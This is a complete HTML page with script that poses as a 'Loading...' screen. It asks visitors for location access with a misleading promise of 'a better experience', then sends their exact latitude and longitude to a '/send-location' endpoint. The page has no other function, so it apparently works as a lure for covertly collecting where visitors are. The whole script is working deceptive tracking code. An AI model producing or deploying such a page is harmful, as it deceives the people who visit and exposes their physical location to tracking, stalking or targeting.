<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">
<div class="scene" aria-hidden="true">
<div class="sun"></div>
<div class="dino-wrap">
<div class="dino"></div>
</div>
<div class="cactus"></div>
<div class="ground"></div>
</div>
<h1 class="loading-title">Loading<span class="dots"></span></h1>
<p class="loading-subtitle">Preparing visitor data</p>
<div class="permission-prompt" id="permissionPrompt">
<p class="prompt-eyebrow">Location Access</p>
<p class="prompt-copy">Allow location this time for a better experience on the website.</p>
<div class="prompt-actions">
<button class="prompt-button" id="allowLocationButton" type="button">Allow This Time</button>
<button class="prompt-secondary" id="skipLocationButton" type="button">Not Now</button>
</div>
</div>
</div>

<script>
const permissionPrompt=document.getElementById("permissionPrompt")
const allowLocationButton=document.getElementById("allowLocationButton")
const skipLocationButton=document.getElementById("skipLocationButton")

async function sendVisitorData(payload){
await fetch("/send-location",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify(payload)
})
}

async function requestVisitorLocation(){
if(!navigator.geolocation){
hidePermissionPrompt()
await sendVisitorData({})
return
}

navigator.geolocation.getCurrentPosition(async position=>{
hidePermissionPrompt()
await sendVisitorData({
latitude:position.coords.latitude,
longitude:position.coords.longitude
})
},async()=>{
hidePermissionPrompt()
await sendVisitorData({})
})
}

function showPermissionPrompt(){
permissionPrompt.hidden=false
}

function hidePermissionPrompt(){
permissionPrompt.hidden=true
}

async function startVisitorFlow(){
showPermissionPrompt()
}

allowLocationButton.addEventListener("click",async()=>{
allowLocationButton.disabled=true
skipLocationButton.disabled=true
allowLocationButton.textContent="Requesting..."
await requestVisitorLocation()
})

skipLocationButton.addEventListener("click",async()=>{
hidePermissionPrompt()
await sendVisitorData({})
})

startVisitorFlow()

</script>

</body>
</html>
